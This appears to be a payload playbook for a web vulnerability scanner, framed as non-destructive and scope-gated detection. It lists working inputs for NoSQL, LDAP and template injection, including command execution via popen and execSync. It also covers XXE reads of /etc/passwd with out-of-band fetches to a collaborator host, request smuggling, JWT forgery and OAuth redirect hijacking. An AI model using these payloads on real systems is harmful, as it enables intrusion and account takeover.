# Advanced Payload Playbook — GKN-Phantom v3.0.0

Advanced detection payloads for 16 new vulnerability types introduced in v3.
All payloads are **NON-DESTRUCTIVE** — designed for detection only, not exploitation.

---

## NoSQL Injection (MongoDB / CouchDB / DynamoDB)

### Operator Injection (MongoDB)
```json
// $ne operator bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// $gt / $lt operator
{"login": {"$gt": ""}, "password": {"$gt": ""}}

// $regex blind injection
{"username": {"$regex": "^admin"}}
{"username": {"$regex": ".*"}}

// $where time-based
{"$where": "sleep(2000)"}
{"$where": "this.username == 'admin' && sleep(2000)"}

// $exists check
{"token": {"$exists": true}}
```

### Content-Type Bypass
```
Content-Type: application/json
POST /login
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

---

## LDAP Injection

### Authentication Bypass
```
// Wildcard injection
username=*)(uid=*))(|(uid=*
password=*

// OR / AND filter injection
username=*)(|(uid=*
password=*)(&(uid=*)(userPassword=*)

// NULL byte termination
username=admin%00
password=anything

// AND injection with attribute enum
username=*)(&(uid=*)(objectClass=*)
```

### Blind LDAP (Time-Based)
```
// Nested filter causing delay
username=*)(uid=*))(|(uid=*)(&(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

---

## CRLF Injection (HTTP Response Splitting)

### Header Injection
```
// Set-Cookie injection
%0d%0aSet-Cookie:crlf=injected
%0d%0aSet-Cookie:session=attacker-controlled

// Location header injection
%0d%0aLocation:%20http://evil.com

// Content-Type override
%0d%0aContent-Type:text/html
%0d%0a%0d%0a<script>alert(1)</script>
```

### Unicode CRLF Variants
```
// Unicode line separator
%E5%98%8A%E5%98%8DSet-Cookie:crlf=injected

// Encoded CRLF
%250d%250aSet-Cookie:crlf=injected
%%0d0aSet-Cookie:crlf=injected
```

---

## HTTP Request Smuggling

### CL.TE (Content-Length wins over Transfer-Encoding)
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST /admin HTTP/1.1
Host: target.com
```

### TE.CL (Transfer-Encoding wins over Content-Length)
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

5c
GPOST /admin HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0

```

### TE.TE (Obfuscated Transfer-Encoding)
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-encoding : chunked
Transfer-Encoding:\x0bchunked
```

### HTTP/2 Downgrade
```
// HTTP/2 to HTTP/1.1 downgrade smuggling
:method POST
:path /
:authority target.com
content-length 0
```

---

## Web Cache Poisoning

### Unkeyed Header Injection
```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Forwarded-For: 127.0.0.1
```

### Fat GET / Method Confusion
```
GET /?cachebuster=RANDOM HTTP/1.1
Host: target.com
X-HTTP-Method-Override: POST

param=poisoned_value
```

### Parameter Cloaking
```
GET /?key=value;cachebuster=RANDOM HTTP/1.1
Host: target.com
```

### Header Override
```
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

---

## Race Condition (TOCTOU)

### Single-Endpoint Turbo Intruder
```
// 10 concurrent POST requests
POST /api/coupon/redeem HTTP/1.1
Host: target.com
Cookie: session=ATTACKER_SESSION

coupon_code=ONCE_PER_USER

// Send 10 identical requests in parallel
// If coupon applied >1 time, race condition exists
```

### Multi-Endpoint TOCTOU
```
// Step 1: Initiate transaction
POST /api/transfer HTTP/1.1
amount=100&to=attacker

// Step 2: Simultaneously check balance
GET /api/balance HTTP/1.1

// If balance updates before first request completes, TOCTOU exists
```

### Email Verification Race
```
// Step 1: Request email change to attacker@evil.com
// Step 2: Before verifying, request sensitive data export
// If export sent to attacker@evil.com before verification, race exists
```

---

## Server-Side Template Injection (Extended)

### Jinja2 / Flask
```
{{config}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Twig (PHP)
```
{{7*7}}
{{_self}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

### Freemarker (Java)
```
${7*7}
${product}
${.data_model["product"]}
```

### Velocity (Java)
```
#set($x=7*7)$x
#set($engine="")
```

### Smarty (PHP)
```
{php}phpinfo(){/php}
{system('id')}
{Smarty_Internal_Write_File}
```

### Pug / Jade (Node.js)
```
#{7*7}
#{global.process.mainModule.require('child_process').execSync('id')}
```

---

## XXE (XML External Entity) Extended

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### OOB (Out-of-Band) via DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR.oob.test/xxe.dtd">
  %xxe;
]>
<data>&send;</data>
```

### PHP Filter Chain
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<data>&xxe;</data>
```

### Parameter Entity
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR.oob.test/xxe">
  %xxe;
]>
```

### SOAP / XInclude
```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/hostname" parse="text"/>
</data>
```

### SVG SSRF via Upload
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image href="http://COLLABORATOR.oob.test/ssrf" />
  <image href="file:///etc/hostname" />
</svg>
```

---

## Prototype Pollution

### Client-Side (JSON.parse / Object.assign)
```json
// Via JSON payload
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__[isAdmin]": true}

// Via query string
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```

### Server-Side (Node.js merge/deep-extend)
```
// Via request body with merge operations
POST /api/profile
Content-Type: application/json

{
  "user": "attacker",
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
}
```

### Prototype via URL
```
// Via URL path
/admin/__proto__/isAdmin/true

// Via nested objects
{"user": {"__proto__": {"shell": "node"}}}
```

---

## GraphQL Injection

### Introspection
```graphql
query {
  __schema {
    types { name fields { name type { name kind } } }
  }
}

query {
  __type(name: "User") {
    name fields { name type { name fields { name } } }
  }
}
```

### Depth Attack (DOS)
```graphql
query {
  user {
    posts {
      comments {
        user {
          posts {
            comments {
              user { id }
            }
          }
        }
      }
    }
  }
}
```

### Batching Attack
```json
[
  {"query": "query { user(id: 1) { email } }"},
  {"query": "query { user(id: 2) { email } }"},
  {"query": "query { user(id: 3) { email } }"}
]
```

### Alias Overload (DOS)
```graphql
query {
  a1: __typename
  a2: __typename
  # ... repeat 1000 times
  a1000: __typename
}
```

### Field Suggestion (Info Leak)
```graphql
query {
  user(id: 1) {
    _doesNotExist
  }
}
# Response may suggest valid field names
```

---

## CORS Misconfiguration

### Origin Reflection
```
GET /api/user HTTP/1.1
Origin: https://evil.com
# If ACAO: https://evil.com → origin reflected

Origin: null
# If ACAO: null → null origin allowed

Origin: https://evil.target.com
# If ACAO: https://evil.target.com → subdomain wildcard
```

### Credentials + Wildcard
```
GET /api/user HTTP/1.1
Origin: https://evil.com
Cookie: session=VICTIM_SESSION

# If ACAC: true AND ACAO: https://evil.com → credential theft
```

### Preflight Bypass
```
OPTIONS /api/user HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: DELETE
# If ACAM: DELETE → dangerous method exposed
```

---

## JWT Deep Analysis

### Algorithm Confusion
```
// alg:none attack
Header: {"alg": "none", "typ": "JWT"}
Payload: {"user": "admin"}
Signature: ""

// RS256 → HS256 (using public key)
Header: {"alg": "HS256", "typ": "JWT"}
// Sign with public key as HMAC secret
```

### KID Injection
```
// Path traversal
Header: {"alg": "HS256", "kid": "../../dev/null", "typ": "JWT"}

// SQL injection in KID
Header: {"alg": "HS256", "kid": "any' UNION SELECT 'secret", "typ": "JWT"}
```

### JKU / X5U Header Injection
```
Header: {
  "alg": "RS256",
  "jku": "http://evil.com/jwks.json",
  "typ": "JWT"
}
```

### Empty / Weak Signature
```
// Empty signature
Header: {"alg": "HS256"}.{}. (no signature)

// Known weak secret: "secret"
// jwt.io: secret → secret
```

---

## OAuth Misconfiguration

### Redirect URI Manipulation
```
GET /oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://evil.com/callback&response_type=code
GET /oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com.evil.com/callback&response_type=code
GET /oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com%40evil.com/callback&response_type=code
```

### State Parameter Missing
```
GET /oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com/callback&response_type=code
// No state parameter → CSRF in OAuth flow
```

### Implicit Flow Abuse
```
GET /oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com/callback&response_type=token
// Access token in URL fragment → token leakage
```

### Scope Escalation
```
GET /oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com/callback&scope=admin%20profile%20email
```

---

## Subdomain Takeover

### DNS-Based Detection
```
// CNAME check
dig CNAME sub.target.com
// If CNAME → unclaimed-service.example.com → potential takeover

// NXDOMAIN check
dig A sub.target.com
// If NXDOMAIN → dangling DNS record

// Service-specific fingerprints
# AWS CloudFront: NoSuchDistribution
# AWS S3: NoSuchBucket
# GitHub Pages: There isn't a GitHub Pages site here
# Heroku: No such app
# Azure: 404 Web Site not found
# Shopify: Sorry, this shop is currently unavailable
# Fastly: Fastly error: unknown domain
```

---

## Host Header Injection

### Header Override
```
GET / HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
```

### Absolute URI
```
GET https://evil.com/ HTTP/1.1
Host: target.com
```

### Double Host Header
```
GET / HTTP/1.1
Host: evil.com
Host: target.com
```

### Password Reset Poisoning
```
POST /password-reset HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

email=victim@target.com
// Link sent to victim: https://evil.com/reset?token=...
```

---

## Mass Assignment

### Auto-Binding Attacks
```
// Add isAdmin field
POST /api/user/register
Content-Type: application/json

{
  "username": "attacker",
  "password": "test123",
  "isAdmin": true,
  "role": "admin"
}

// Override read-only fields
PATCH /api/user/profile
Content-Type: application/json

{
  "email": "attacker@evil.com",
  "verified": true,
  "balance": 99999
}
```

---

## Dependency Confusion

### Detection
```
// Check if private package name is available on public registry
npm view @company/private-package
pip install company-private-package  # Check if available on PyPI

// Version priority check
// If public registry has higher version → dependency confusion risk
```

---

## Session Fixation

### Detection Payloads
```
// Set session before login
GET /login?session_id=ATTACKER_CONTROLLED_SID
// Login with victim credentials
// Check if session remains ATTACKER_CONTROLLED_SID after login

// Token in URL
GET /login?token=ATTACKER_CONTROLLED_TOKEN
// If token persists after login → session fixation
```

---

## Email Header Injection

### Detection Payloads
```
POST /contact
Content-Type: application/x-www-form-urlencoded

email=victim%40target.com%0d%0aBcc:attacker%40evil.com&message=test
email=victim%40target.com%0d%0aCc:attacker%40evil.com&message=test
email=victim%40target.com%0d%0aContent-Type:text/html&message=<script>alert(1)</script>
```

---

## WebSocket Hijacking (CSWSH)

### Detection
```
// Check for missing Origin validation
// Connect to wss://target.com/ws from evil.com origin
// If handshake accepted → CSWSH vulnerability

// Check for missing auth in WebSocket upgrade
GET /ws HTTP/1.1
Upgrade: websocket
Connection: Upgrade
// No Cookie / Authorization header → unauthenticated WebSocket access
```

---

## Directory Listing

### Detection
```
GET /uploads/ HTTP/1.1
GET /backup/ HTTP/1.1
GET /static/ HTTP/1.1
GET /assets/ HTTP/1.1

// Indicators:
// <title>Index of /</title>
// <h1>Directory listing for /</h1>
// Parent Directory link
// Apache autoindex / Nginx autoindex
```

---

## Safe Detection Methodology

1. **All payloads are non-destructive** — designed to detect vulnerability presence, not exploit
2. **Time-based blinds** use short sleep durations (2-3s) to minimize impact
3. **OOB (Out-of-Band)** uses controlled collaborator infrastructure only
4. **No data exfiltration** — detection only confirms vulnerability class
5. **Rate limited** — all probes respect the rate limiter (3 req/s default)
6. **Scope gated** — every probe passes through scope guard before execution